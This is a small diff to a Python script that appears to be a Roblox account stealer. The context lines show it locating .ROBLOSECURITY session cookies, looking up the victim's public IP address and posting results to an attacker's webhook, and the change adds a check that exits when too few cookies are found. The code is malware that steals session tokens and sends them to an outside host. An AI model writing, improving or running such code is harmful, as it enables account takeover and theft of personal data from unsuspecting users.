@@ -145,6 +145,10 @@ if cookies is None:
     requests.post(url=send_webhook, data={"content": "No .ROBLOSECURITY cookies found."})
     exit()
     
+if len(cookies) < 2:
+    requests.post(url=send_webhook, data={"content": "No .ROBLOSECURITY cookie found."})
+    exit()
+    
 roblox_cookie = cookies[1]
 ip_address = requests.get("https://api.ipify.org/").text
 #################### checking cookie #############
